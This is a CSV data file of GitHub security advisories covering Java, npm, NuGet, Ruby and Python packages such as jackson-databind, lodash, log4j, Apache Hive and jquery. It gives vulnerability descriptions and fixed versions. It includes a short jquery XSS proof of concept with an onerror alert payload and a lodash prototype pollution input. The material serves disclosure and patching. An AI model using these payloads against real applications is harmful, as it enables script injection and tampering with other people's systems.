2126,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-8c4j-34r4-xr8g,CVE-2020-36180,https://github.com/advisories/GHSA-8c4j-34r4-xr8g,high,2021-12-09 19:16:18 UTC,Unsafe Deserialization in jackson-databind,"FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, related to org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS.",maven
2127,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-m6x4-97wx-4q27,CVE-2020-36184,https://github.com/advisories/GHSA-m6x4-97wx-4q27,high,2021-12-09 19:16:26 UTC,Unsafe Deserialization in jackson-databind,"FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, related to org.apache.tomcat.dbcp.dbcp2.datasources.PerUserPoolDataSource.",maven
2128,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-9m6f-7xcq-8vf8,CVE-2020-36183,https://github.com/advisories/GHSA-9m6f-7xcq-8vf8,high,2021-12-09 19:16:34 UTC,Unsafe Deserialization in jackson-databind,"FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, related to org.docx4j.org.apache.xalan.lib.sql.JNDIConnectionPool.",maven
2129,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-f9xh-2qgp-cq57,CVE-2020-36188,https://github.com/advisories/GHSA-f9xh-2qgp-cq57,high,2021-12-09 19:16:42 UTC,Unsafe Deserialization in jackson-databind,"FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, related to com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource.",maven
2130,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-r695-7vr9-jgc2,CVE-2020-36187,https://github.com/advisories/GHSA-r695-7vr9-jgc2,high,2021-12-09 19:16:51 UTC,Unsafe Deserialization in jackson-databind,"FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, related to org.apache.tomcat.dbcp.dbcp.datasources.SharedPoolDataSource.",maven
2131,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-vfqx-33qm-g869,CVE-2020-36189,https://github.com/advisories/GHSA-vfqx-33qm-g869,high,2021-12-09 19:16:59 UTC,Unsafe Deserialization in jackson-databind,"FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, related to com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource.",maven
2132,34028,org.apache.velocity:velocity,GHSA-59j4-wjwp-mw9m,CVE-2020-13936,https://github.com/advisories/GHSA-59j4-wjwp-mw9m,high,2022-01-06 20:32:36 UTC,Sandbox Bypass in Apache Velocity Engine,An attacker that is able to modify Velocity templates may execute arbitrary Java code or run arbitrary system commands with the same privileges as the account running the Servlet container. This applies to applications that allow untrusted users to upload/modify velocity templates running Apache Velocity Engine versions up to 2.2.,maven
2133,35284,com.fasterxml.jackson.dataformat:jackson-dataformat-cbor,GHSA-xmc8-26q4-qjhx,CVE-2020-28491,https://github.com/advisories/GHSA-xmc8-26q4-qjhx,high,2021-12-09 19:17:21 UTC,Denial of Service (DoS) in Jackson Dataformat CBOR,"This affects the package com.fasterxml.jackson.dataformat:jackson-dataformat-cbor from 0 and before 2.11.4, from 2.12.0-rc1 and before 2.12.1. Unchecked allocation of byte buffer can cause a java.lang.OutOfMemoryError exception.",maven
2134,15538,CefSharp.WinForms,GHSA-m7mf-48hp-5qmr,CVE-2020-16009,https://github.com/advisories/GHSA-m7mf-48hp-5qmr,high,2020-12-02 18:28:47 UTC,Inappropriate implementation in V8,"CVE-2020-16009: Inappropriate implementation in V8

- https://chromereleases.googleblog.com/2020/11/stable-channel-update-for-desktop.html
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-16009

Google is aware of reports that exploits for CVE-2020-16009 exist in the wild.

Allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.

There is currently little to no public information on the issue other than it has been flagged as `High` severity.",nuget
2135,15538,CefSharp.WinForms,GHSA-x7fx-mcc9-27j7,CVE-2020-16013,https://github.com/advisories/GHSA-x7fx-mcc9-27j7,high,2020-11-27 20:12:55 UTC,Inappropriate implementation in V8 in CefSharp,"High CVE-2020-16013: Inappropriate implementation in V8. 

- https://chromereleases.googleblog.com/2020/11/stable-channel-update-for-desktop_11.html
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-16013

Google is aware of reports that exploits for CVE-2020-16013 and CVE-2020-16017 exist in the wild.

There is currently little to no public information on the issue other than it has been flagged as `High` severity.",nuget
2136,15538,CefSharp.WinForms,GHSA-gvqv-779r-4jgp,CVE-2020-16017,https://github.com/advisories/GHSA-gvqv-779r-4jgp,high,2020-11-27 20:13:05 UTC,Use after free in CefSharp,"CVE-2020-16017: Use after free in site isolation

- https://chromereleases.googleblog.com/2020/11/stable-channel-update-for-desktop_11.html
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-16017

Google is aware of reports that exploits for CVE-2020-16013 and CVE-2020-16017 exist in the wild.

There is currently little to no public information on the issue other than it has been flagged as `High` severity.",nuget
2137,15538,CefSharp.WinForms,GHSA-pv36-h7jh-qm62,CVE-2020-15999,https://github.com/advisories/GHSA-pv36-h7jh-qm62,moderate,2020-10-27 19:47:38 UTC,Heap buffer overflow in CefSharp,"### Impact
A memory corruption bug(Heap overflow) in the FreeType font rendering library.

> This can be exploited by attackers to execute arbitrary code by using specially crafted fonts with embedded PNG images .

As per https://www.secpod.com/blog/chrome-zero-day-under-active-exploitation-patch-now/ 

Google is aware of reports that an exploit for CVE-2020-15999 exists in the wild.

### Patches
Upgrade to 85.3.130 or higher

### References
- https://www.secpod.com/blog/chrome-zero-day-under-active-exploitation-patch-now/
- https://www.zdnet.com/article/google-releases-chrome-security-update-to-patch-actively-exploited-zero-day/
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15999
- https://magpcss.org/ceforum/viewtopic.php?f=10&t=17942

To review the `CEF/Chromium` patch see https://bitbucket.org/chromiumembedded/cef/commits/cd6cbe008b127990036945fb75e7c2c1594ab10d",nuget
2138,34939,axis:axis,GHSA-55w9-c3g2-4rrh,CVE-2012-5784,https://github.com/advisories/GHSA-55w9-c3g2-4rrh,moderate,2020-10-07 17:51:02 UTC,Man-in-the-middle attack in Apache Axis,"Apache Axis 1.4 and earlier, as used in PayPal Payments Pro, PayPal Mass Pay, PayPal Transactional Information SOAP, the Java Message Service implementation in Apache ActiveMQ, and other products, does not verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate.",maven
2139,34939,axis:axis,GHSA-96jq-75wh-2658,CVE-2018-8032,https://github.com/advisories/GHSA-96jq-75wh-2658,moderate,2018-10-16 20:51:15 UTC,Moderate severity vulnerability that affects apache axis,Apache Axis 1.x up to and including 1.4 is vulnerable to a cross-site scripting (XSS) attack in the default servlet/services.,maven
2140,15892,jquery,GHSA-2pqj-h3vj-pqgw,CVE-2012-6708,https://github.com/advisories/GHSA-2pqj-h3vj-pqgw,high,2020-09-01 16:41:46 UTC,Cross-Site Scripting in jquery,"Affected versions of `jquery` are vulnerable to cross-site scripting. This occurs because the main `jquery` function uses a regular expression to differentiate between HTML and selectors, but does not properly anchor the regular expression. The result is that `jquery` may interpret HTML as selectors when given certain inputs, allowing for client side code execution.

## Proof of Concept
```
$(""#log"").html(
    $(""element[attribute='<img src=\""x\"" onerror=\""alert(1)\"" />']"").html()
);
```




## Recommendation

Update to version 1.9.0 or later.",npm
2141,33954,dom4j:dom4j,GHSA-6pcc-3rfx-4gpm,CVE-2018-1000632,https://github.com/advisories/GHSA-6pcc-3rfx-4gpm,high,2018-10-16 17:01:25 UTC,Dom4j contains a XML Injection vulnerability,"dom4j version prior to version 2.1.1 contains a CWE-91: XML Injection vulnerability in Class: Element. Methods: addElement, addAttribute that can result in an attacker tampering with XML documents through XML injection. This attack appear to be exploitable via an attacker specifying attributes or elements in the XML document. This vulnerability appears to have been fixed in 2.1.1 or later.

Note: This advisory applies to `dom4j:dom4j` version 1.x legacy artifacts.  To resolve this a change to the latest version of `org.dom4j:dom4j` is recommended.",maven
2142,33954,dom4j:dom4j,GHSA-hwj3-m3p6-hj38,CVE-2020-10683,https://github.com/advisories/GHSA-hwj3-m3p6-hj38,critical,2020-06-05 16:13:36 UTC,dom4j allows External Entities by default which might enable XXE attacks,"dom4j before 2.1.3 allows external DTDs and External Entities by default, which might enable XXE attacks. However, there is popular external documentation from OWASP showing how to enable the safe, non-default behavior in any application that uses dom4j.

Note: This advisory applies to `dom4j:dom4j` version 1.x legacy artifacts.  To resolve this a change to the latest version of `org.dom4j:dom4j` is recommended.",maven
2143,33909,org.apache.logging.log4j:log4j-core,GHSA-fxph-q3j8-mv87,CVE-2017-5645,https://github.com/advisories/GHSA-fxph-q3j8-mv87,critical,2020-01-06 18:43:38 UTC,Deserialization of Untrusted Data in Log4j,"In Apache Log4j 2.x before 2.8.2, when using the TCP socket server or UDP socket server to receive serialized log events from another application, a specially crafted binary payload can be sent that, when deserialized, can execute arbitrary code.",maven
2144,33909,org.apache.logging.log4j:log4j-core,GHSA-vwqq-5vrc-xw9h,CVE-2020-9488,https://github.com/advisories/GHSA-vwqq-5vrc-xw9h,low,2020-06-05 14:15:51 UTC,Improper validation of certificate with host mismatch in Apache Log4j SMTP appender,Improper validation of certificate with host mismatch in Apache Log4j SMTP appender prior to version 2.13.2. This could allow an SMTPS connection to be intercepted by a man-in-the-middle attack which could leak any log messages sent through that appender.,maven
2145,33904,commons-collections:commons-collections,GHSA-6hgm-866r-3cjv,CVE-2015-6420,https://github.com/advisories/GHSA-6hgm-866r-3cjv,high,2020-06-15 20:36:20 UTC,Insecure Deserialization in Apache Commons Collection,Serialized-object interfaces in Java applications using the Apache Commons Collections (ACC) library may allow remote attackers to execute arbitrary commands via a crafted serialized Java object.,maven
2146,17501,apollo-server-express,GHSA-w42g-7vfc-xf37,,https://github.com/advisories/GHSA-w42g-7vfc-xf37,moderate,2020-06-05 19:38:14 UTC,Introspection in schema validation in Apollo Server,"We encourage all users of Apollo Server to read this advisory in its entirety to understand the impact.  The _Resolution_ section contains details on patched versions.

### Impact

If `subscriptions: false` is passed to the `ApolloServer` constructor options, there is no impact.  If implementors were not expecting validation rules to be enforced on the WebSocket subscriptions transport **and** are unconcerned about introspection being enabled on the WebSocket subscriptions transport (or were not expecting that), then this advisory is not applicable.  If `introspection: true` is passed to the `ApolloServer` constructor options, the impact is limited to user-provided validation rules (i.e., using `validationRules`) since there would be no expectation that introspection was disabled.

The enforcement of user-provided validation rules on the HTTP transport is working as intended and is unaffected by this advisory.  Similarly, disabling introspection on the HTTP transport is working as intended and is unaffected by this advisory.

> **Note:** Unless `subscriptions: false` is explicitly passed to the constructor parameters of `new ApolloServer({ ... })`, **subscriptions are enabled by default, whether or not there is a `Subscription` type present in the schema.**  As an alternative to upgrading to a patched version, see the _Workarounds_ section below to disable subscriptions if it is not necessary.

In cases where `subscriptions: false` is **not** explicitly set, the subscription server **is impacted** since validation rules which are enforced on the main request pipeline within Apollo Server were not being passed to the `SubscriptionServer.create` invocation ([seen here, prior to the patch](https://github.com/apollographql/apollo-server/blob/7d6f23443e52a90deb74f152f34bb76eea78ee19/packages/apollo-server-core/src/ApolloServer.ts#L677-L726)). 

The omitted validation rules for the subscription server include any `validationRules` passed by implementors to the `ApolloServer` constructor which were expected to be enforced on the subscriptions WebSocket endpoint.  **Additionally**, because an internal [`NoIntrospection`](https://github.com/apollographql/apollo-server/blob/7d6f23443/packages/apollo-server-core/src/ApolloServer.ts#L77-L88) validation rule is used to disable introspection, it would have been possible to introspect a server on the WebSocket endpoint that the `SubscriptionServer` creates even though it was not possible on other transports (e.g. HTTP).

**The severity of risk depends on whether sensitive information is being stored in the schema itself.**  The contents of schema descriptions, or secrets which might be revealed by the names of types or field names within those types, will determine the risk to individual implementors.

### Affected packages

The bug existed in `apollo-server-core` versions prior to version 2.14.2, however, this means all integration packages (e.g., `apollo-server-express`, etc.) prior to version 2.14.2 which depend on `apollo-server-core` for their subscriptions support are affected.  This includes the `apollo-server` package that automatically provides an Express server.

Therefore, for officially published Apollo Server packages, the full list of affected packages includes: `apollo-server`, `apollo-server-azure-functions`, `apollo-server-cache-memcached`, `apollo-server-core`, `apollo-server-cloud-functions`, `apollo-server-cloudflare`, `apollo-server-express`, `apollo-server-fastify`, `apollo-server-hapi`, `apollo-server-koa`, `apollo-server-lambda`, and `apollo-server-micro`.

> Note: The full list included here doesn't fit into the box provided by the GitHub Security Advisories form.

### Resolution

The problem is resolved in Apollo Server versions 2.14.2 or higher.  If upgrading is not an option, see _Workarounds_ below.  When upgrading, ensure that the affected integration package (e.g., `apollo-server-express`) **and** the `apollo-server-core` package are both updated to the patched versions.  (The version numbers should both be  2.14.2.)

### Workarounds

Upgrading to a patched version is the recommended solution.  If upgrading is not an option, subscriptions can be disabled with `subscriptions: false` to resolve the impact.  **Disabling subscriptions in this way will disable _all_ subscriptions support and the WebSocket transport**:

```js
const server = new ApolloServer({
  subscriptions: false,
  /* Other options, such as typeDefs, resolvers, schema, etc. */
});
```

### For more information
If you have any questions or comments about this advisory, please [open an issue](https://github.com/apollographql/apollo-server/issues/new) and the maintainers will try to assist.

### Credit and appreciation

Apollo fully believes in ethical disclosure of vulnerabilities by security researchers who notify us with details and provide us time to address and fix the issues before publicly disclosing.

Credit for this discovery goes to the team at [Bitwala](https://www.bitwala.com/), who reported the concern to us responsibly after discovering it during their own auditing.",npm
2147,36687,org.springframework:spring-webflux,GHSA-7pm4-g2qj-j85x,CVE-2020-5397,https://github.com/advisories/GHSA-7pm4-g2qj-j85x,moderate,2020-01-21 20:59:33 UTC,CSRF attack via CORS preflight requests with Spring MVC or Spring WebFlux,"Spring Framework, versions 5.2.x prior to 5.2.3 are vulnerable to CSRF attacks through CORS preflight requests that target Spring MVC (spring-webmvc module) or Spring WebFlux (spring-webflux module) endpoints. Only non-authenticated endpoints are vulnerable because preflight requests should not include credentials and therefore requests should fail authentication. However a notable exception to this are Chrome based browsers when using client certificates for authentication since Chrome sends TLS client certificates in CORS preflight requests in violation of spec requirements. No HTTP body can be sent or received as a result of this attack.",maven
2148,36687,org.springframework:spring-webflux,GHSA-8wx2-9q48-vm9r,CVE-2020-5398,https://github.com/advisories/GHSA-8wx2-9q48-vm9r,high,2020-01-21 20:59:09 UTC,RFD attack via Content-Disposition header sourced from request input by Spring MVC or Spring WebFlux Application,"In Spring Framework, versions 5.2.x prior to 5.2.3, versions 5.1.x prior to 5.1.13, and versions 5.0.x prior to 5.0.16, an application is vulnerable to a reflected file download (RFD) attack when it sets a ""Content-Disposition"" header in the response where the filename attribute is derived from user supplied input.",maven
2149,18808,lodash,GHSA-jf85-cpcp-j695,CVE-2019-10744,https://github.com/advisories/GHSA-jf85-cpcp-j695,critical,2019-07-10 19:45:23 UTC,Prototype Pollution in lodash,"Versions of `lodash` before 4.17.12 are vulnerable to Prototype Pollution.  The function `defaultsDeep` allows a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.




## Recommendation

Update to version 4.17.12 or later.",npm
2150,26899,rexical,GHSA-cr5j-953j-xw5p,CVE-2019-5477,https://github.com/advisories/GHSA-cr5j-953j-xw5p,critical,2019-08-19 19:27:23 UTC,Arbitrary execution of code in Nokogiri,A command injection vulnerability in Nokogiri v1.10.3 and earlier allows commands to be executed in a subprocess via Ruby's `Kernel.open` method. Processes are vulnerable only if the undocumented method `Nokogiri::CSS::Tokenizer#load_file` is being called with unsafe user input as the filename. This vulnerability appears in code generated by the Rexical gem versions v1.0.6 and earlier. Rexical is used by Nokogiri to generate lexical scanner code for parsing CSS queries. The underlying vulnerability was addressed in Rexical v1.0.7 and Nokogiri upgraded to this version of Rexical in Nokogiri v1.10.4.,rubygems
2151,17734,lodash.defaultsdeep,GHSA-jf85-cpcp-j695,CVE-2019-10744,https://github.com/advisories/GHSA-jf85-cpcp-j695,critical,2019-07-10 19:45:23 UTC,Prototype Pollution in lodash,"Versions of `lodash` before 4.17.12 are vulnerable to Prototype Pollution.  The function `defaultsDeep` allows a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.




## Recommendation

Update to version 4.17.12 or later.",npm
2152,18656,lodash.mergewith,GHSA-jf85-cpcp-j695,CVE-2019-10744,https://github.com/advisories/GHSA-jf85-cpcp-j695,critical,2019-07-10 19:45:23 UTC,Prototype Pollution in lodash,"Versions of `lodash` before 4.17.12 are vulnerable to Prototype Pollution.  The function `defaultsDeep` allows a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.




## Recommendation

Update to version 4.17.12 or later.",npm
2153,16314,lodash.merge,GHSA-jf85-cpcp-j695,CVE-2019-10744,https://github.com/advisories/GHSA-jf85-cpcp-j695,critical,2019-07-10 19:45:23 UTC,Prototype Pollution in lodash,"Versions of `lodash` before 4.17.12 are vulnerable to Prototype Pollution.  The function `defaultsDeep` allows a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.




## Recommendation

Update to version 4.17.12 or later.",npm
2154,17112,lodash.template,GHSA-jf85-cpcp-j695,CVE-2019-10744,https://github.com/advisories/GHSA-jf85-cpcp-j695,critical,2019-07-10 19:45:23 UTC,Prototype Pollution in lodash,"Versions of `lodash` before 4.17.12 are vulnerable to Prototype Pollution.  The function `defaultsDeep` allows a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.




## Recommendation

Update to version 4.17.12 or later.",npm
2155,28766,jupyterhub,GHSA-rv62-4pmj-xw6h,CVE-2019-10255,https://github.com/advisories/GHSA-rv62-4pmj-xw6h,moderate,2019-04-02 15:46:54 UTC,Moderate severity vulnerability that affects jupyterhub and notebook,"An Open Redirect vulnerability for all browsers in Jupyter Notebook before 5.7.8 and some browsers (Chrome, Firefox) in JupyterHub before 0.9.6 allows crafted links to the login page, which will redirect to a malicious site after successful login. Servers running on a base_url prefix are not affected.",pip
2156,36029,org.apache.hive:hive-service,GHSA-2g9q-chq2-w8qw,CVE-2017-12625,https://github.com/advisories/GHSA-2g9q-chq2-w8qw,moderate,2019-03-14 15:40:16 UTC,"Moderate severity vulnerability that affects org.apache.hive:hive, org.apache.hive:hive-exec, and org.apache.hive:hive-service","Apache Hive 2.1.x before 2.1.2, 2.2.x before 2.2.1, and 2.3.x before 2.3.1 expose an interface through which masking policies can be defined on tables or views, e.g., using Apache Ranger. When a view is created over a given table, the policy enforcement does not happen correctly on the table for masked columns.",maven
2157,34704,org.apache.hive:hive-exec,GHSA-gf2v-9hp6-44qg,CVE-2016-3083,https://github.com/advisories/GHSA-gf2v-9hp6-44qg,high,2019-03-14 15:40:32 UTC,"org.apache.hive:hive, org.apache.hive:hive-exec, and org.apache.hive:hive-service vulnerable to Improper Certificate Validation ","Apache Hive (JDBC + HiveServer2) implements SSL for plain TCP and HTTP connections (it supports both transport modes). While validating the server's certificate during the connection setup, the client in Apache Hive before 1.2.2 and 2.0.x before 2.0.1 doesn't seem to be verifying the common name attribute of the certificate. In this way, if a JDBC client sends an SSL request to server abc.com, and the server responds with a valid certificate (certified by CA) but issued to xyz.com, the client will accept that as a valid certificate and the SSL handshake will go through.",maven
2158,36029,org.apache.hive:hive-service,GHSA-5gvm-hrw5-h6xf,CVE-2015-1772,https://github.com/advisories/GHSA-5gvm-hrw5-h6xf,high,2019-03-14 15:40:44 UTC,"Improper Authentication in org.apache.hive:hive, org.apache.hive:hive-exec, and org.apache.hive:hive-service","The LDAP implementation in HiveServer2 in Apache Hive before 1.0.1 and 1.1.x before 1.1.1, as used in IBM InfoSphere BigInsights 3.0, 3.0.0.1, and 3.0.0.2 and other products, mishandles simple unauthenticated and anonymous bind configurations, which allows remote attackers to bypass authentication via a crafted LDAP request.",maven
2159,16915,bootstrap-sass,GHSA-wh77-3x4m-4q9g,CVE-2019-8331,https://github.com/advisories/GHSA-wh77-3x4m-4q9g,moderate,2019-02-22 20:54:27 UTC,Moderate severity vulnerability that affects bootstrap and bootstrap-sass,"In Bootstrap 4 before 4.3.1 and Bootstrap 3 before 3.4.1, XSS is possible in the tooltip or popover data-template attribute. For more information, see: https://blog.getbootstrap.com/2019/02/13/bootstrap-4-3-1-and-3-4-1/",npm
2160,18976,bootstrap-sass,GHSA-9v3m-8fp8-mj99,CVE-2019-8331,https://github.com/advisories/GHSA-9v3m-8fp8-mj99,moderate,2019-02-22 20:54:47 UTC,Cross-Site Scripting in bootstrap,"Versions of `bootstrap` prior to 3.4.1 for 3.x and 4.3.1 for 4.x are vulnerable to Cross-Site Scripting (XSS). The  `data-template` attribute of the tooltip and popover plugins lacks input sanitization and may allow attacker to execute arbitrary JavaScript.


## Recommendation

For `bootstrap` 4.x upgrade to 4.3.1 or later.
For `bootstrap` 3.x upgrade to 3.4.1 or later.",rubygems
2161,36029,org.apache.hive:hive-service,GHSA-rxmr-c9jm-7mm8,CVE-2018-1284,https://github.com/advisories/GHSA-rxmr-c9jm-7mm8,low,2018-11-21 22:24:22 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Apache hive,"In Apache Hive 0.6.0 to 2.3.2, malicious user might use any xpath UDFs (xpath/xpath_string/xpath_boolean/xpath_number/xpath_double/xpath_float/xpath_long/xpath_int/xpath_short) to expose the content of a file on the machine running HiveServer2 owned by HiveServer2 user (usually hive) if hive.server2.enable.doAs=false.",maven
2162,36029,org.apache.hive:hive-service,GHSA-p639-xxv5-j383,CVE-2018-1315,https://github.com/advisories/GHSA-p639-xxv5-j383,low,2018-11-21 22:24:08 UTC,Incorrect Permission Assignment for Critical Resource in Apache hive,"In Apache Hive 2.1.0 to 2.3.2, when 'COPY FROM FTP' statement is run using HPL/SQL extension to Hive, a compromised/malicious FTP server can cause the file to be written to an arbitrary location on the cluster where the command is run from. This is because FTP client code in HPL/SQL does not verify the destination location of the downloaded file. This does not affect hive cli user and hiveserver2 user as hplsql is a separate command line script and needs to be invoked differently.",maven
2163,36029,org.apache.hive:hive-service,GHSA-83r3-c79w-f6wc,CVE-2015-7521,https://github.com/advisories/GHSA-83r3-c79w-f6wc,high,2018-11-21 22:23:49 UTC,"High severity vulnerability that affects org.apache.hive:hive, org.apache.hive:hive-exec, and org.apache.hive:hive-service","The authorization framework in Apache Hive 1.0.0, 1.0.1, 1.1.0, 1.1.1, 1.2.0 and 1.2.1, on clusters protected by Ranger and SqlStdHiveAuthorization, allows attackers to bypass intended parent table access restrictions via unspecified partition-level operations.",maven
2164,36029,org.apache.hive:hive-service,GHSA-w4x9-4f5x-8jj8,CVE-2014-0228,https://github.com/advisories/GHSA-w4x9-4f5x-8jj8,low,2018-11-21 22:23:29 UTC,"Low severity vulnerability that affects      org.apache.hive:hive-exec, org.apache.hive:hive, and org.apache.hive:hive-service","Apache Hive before 0.13.1, when in SQL standards based authorization mode, does not properly check the file permissions for (1) import and (2) export statements, which allows remote authenticated users to obtain sensitive information via a crafted URI.",maven
2165,34432,io.spray:spray-json_2.11,GHSA-q8xj-8xg3-w432,CVE-2018-18854,https://github.com/advisories/GHSA-q8xj-8xg3-w432,high,2018-11-09 17:41:35 UTC,Uncontrolled Resource Consumption in spray-json,Lightbend Spray spray-json through 1.3.4 allows remote attackers to cause a denial of service (resource consumption) because of Algorithmic Complexity during the parsing of many JSON object fields (with keys that have the same hash code).,maven
2166,34432,io.spray:spray-json_2.11,GHSA-f94m-mqhr-mc29,CVE-2018-18853,https://github.com/advisories/GHSA-f94m-mqhr-mc29,high,2018-11-09 17:42:26 UTC,Uncontrolled Resource Consumption in spray-json when parsing decimal digit fields,Lightbend Spray spray-json through 1.3.4 allows remote attackers to cause a denial of service (resource consumption) because of Algorithmic Complexity during the parsing of a field composed of many decimal digits.,maven
2167,35074,com.typesafe.akka:akka-http-core_2.11,GHSA-gfx6-ph4q-q54q,CVE-2017-1000118,https://github.com/advisories/GHSA-gfx6-ph4q-q54q,high,2018-10-22 20:53:02 UTC,Improper Restriction of Operations within the Bounds of a Memory Buffer in akka-http-core,Akka HTTP versions <= 10.0.5 Illegal Media Range in Accept Header Causes StackOverflowError Leading to Denial of Service,maven
2168,35074,com.typesafe.akka:akka-http-core_2.11,GHSA-9qgc-p27w-3hjg,CVE-2018-16131,https://github.com/advisories/GHSA-9qgc-p27w-3hjg,high,2018-10-22 20:37:07 UTC,High severity vulnerability that affects com.typesafe.akka:akka-http-core_2.11 and com.typesafe.akka:akka-http-core_2.12,The decodeRequest and decodeRequestWith directives in Lightbend Akka HTTP 10.1.x through 10.1.4 and 10.0.x through 10.0.13 allow remote attackers to cause a denial of service (memory consumption and daemon crash) via a ZIP bomb.,maven
2169,36654,io.swagger:swagger-parser,GHSA-q7pf-qr96-2vq5,CVE-2017-1000208,https://github.com/advisories/GHSA-q7pf-qr96-2vq5,high,2018-10-19 16:46:41 UTC,Deserialization of Untrusted Data in swagger-parser,"A vulnerability in Swagger-Parser's (version <= 1.0.30) yaml parsing functionality results in arbitrary code being executed when a maliciously crafted yaml Open-API specification is parsed. This in particular, affects the 'generate' and 'validate' command in swagger-codegen (<= 2.2.2) and can lead to arbitrary code being executed when these commands are used on a well-crafted yaml specification.",maven
2170,39194,io.swagger:swagger-codegen,GHSA-vgvf-9jh3-fg75,CVE-2017-1000207,https://github.com/advisories/GHSA-vgvf-9jh3-fg75,high,2018-10-19 16:46:30 UTC,Deserialization of Untrusted Data in swagger-codegen,"A vulnerability in Swagger-Parser's version <= 1.0.30 and Swagger codegen version <= 2.2.2 yaml parsing functionality results in arbitrary code being executed when a maliciously crafted yaml Open-API specification is parsed. This in particular, affects the 'generate' and 'validate' command in swagger-codegen (<= 2.2.2) and can lead to arbitrary code being executed when these commands are used on a well-crafted yaml specification.",maven
2171,34270,com.rabbitmq:amqp-client,GHSA-w4g2-9hj6-5472,CVE-2018-11087,https://github.com/advisories/GHSA-w4g2-9hj6-5472,moderate,2018-10-18 18:06:08 UTC,Moderate severity vulnerability that affects com.rabbitmq:amqp-client and org.springframework.amqp:spring-amqp,"Pivotal Spring AMQP, 1.x versions prior to 1.7.10 and 2.x versions prior to 2.0.6, expose a man-in-the-middle vulnerability due to lack of hostname validation. A malicious user that has the ability to intercept traffic would be able to view data in transit.",maven
2172,35085,org.bouncycastle:bcprov-jdk15,GHSA-9gp4-qrff-c648,CVE-2016-1000345,https://github.com/advisories/GHSA-9gp4-qrff-c648,moderate,2018-10-18 18:04:13 UTC,Moderate severity vulnerability that affects org.bouncycastle:bcprov-jdk14 and org.bouncycastle:bcprov-jdk15,"In the Bouncy Castle JCE Provider version 1.55 and earlier the DHIES/ECIES CBC mode vulnerable to padding oracle attack. For BC 1.55 and older, in an environment where timings can be easily observed, it is possible with enough observations to identify when the decryption is failing due to padding.",maven
2173,34025,org.springframework.security:spring-security-core,GHSA-8crv-49fr-2h6j,CVE-2016-5007,https://github.com/advisories/GHSA-8crv-49fr-2h6j,high,2018-10-17 20:30:12 UTC,Improper Authorization in org.springframework.security:spring-security-core and org.springframework:spring-core,"Both Spring Security 3.2.x, 4.0.x, 4.1.0 and the Spring Framework 3.2.x, 4.0.x, 4.1.x, 4.2.x rely on URL pattern mappings for authorization and for mapping requests to controllers respectively. Differences in the strictness of the pattern matching mechanisms, for example with regards to space trimming in path segments, can lead Spring Security to not recognize certain paths as not protected that are in fact mapped to Spring MVC controllers that should be protected. The problem is compounded by the fact that the Spring Framework provides richer features with regards to pattern matching as well as by the fact that pattern matching in each Spring Security and the Spring Framework can easily be customized creating additional differences.",maven
2174,34025,org.springframework.security:spring-security-core,GHSA-v596-fwhq-8x48,CVE-2018-1199,https://github.com/advisories/GHSA-v596-fwhq-8x48,moderate,2018-10-17 20:01:54 UTC,"Improper Input Validation in org.springframework.security:spring-security-core, org.springframework.security:spring-security-core , and org.springframework:spring-core","Spring Security (Spring Security 4.1.x before 4.1.5, 4.2.x before 4.2.4, and 5.0.x before 5.0.1; and Spring Framework 4.3.x before 4.3.14 and 5.0.x before 5.0.3) does not consider URL path parameters when processing security constraints. By adding a URL path parameter with special encodings, an attacker may be able to bypass a security constraint. The root cause of this issue is a lack of clarity regarding the handling of path parameters in the Servlet Specification. Some Servlet containers include path parameters in the value returned for getPathInfo() and some do not. Spring Security uses the value returned by getPathInfo() as part of the process of mapping requests to security constraints. In this particular attack, different character encodings used in path parameters allows secured Spring MVC static resource URLs to be bypassed.",maven
2175,38414,cn.hutool:hutool-core,GHSA-rhq2-2574-78mc,CVE-2018-17297,https://github.com/advisories/GHSA-rhq2-2574-78mc,high,2018-10-17 19:54:53 UTC,Unzip function in ZipUtil.java in Hutool allows remote attackers to overwrite arbitrary files via directory traversal,The unzip function in ZipUtil.java in Hutool before 4.1.12 allows remote attackers to overwrite arbitrary files via directory traversal sequences in a filename within a ZIP archive.,maven
2176,37675,org.bouncycastle:bcprov-jdk14,GHSA-4mv7-cq75-3qjm,CVE-2015-7940,https://github.com/advisories/GHSA-4mv7-cq75-3qjm,moderate,2018-10-17 16:27:50 UTC,Moderate severity vulnerability that affects org.bouncycastle:bcprov-jdk14 and org.bouncycastle:bcprov-jdk15,"The Bouncy Castle Java library before 1.51 does not validate a point is withing the elliptic curve, which makes it easier for remote attackers to obtain private keys via a series of crafted elliptic curve Diffie Hellman (ECDH) key exchanges, aka an ""invalid curve attack.""",maven
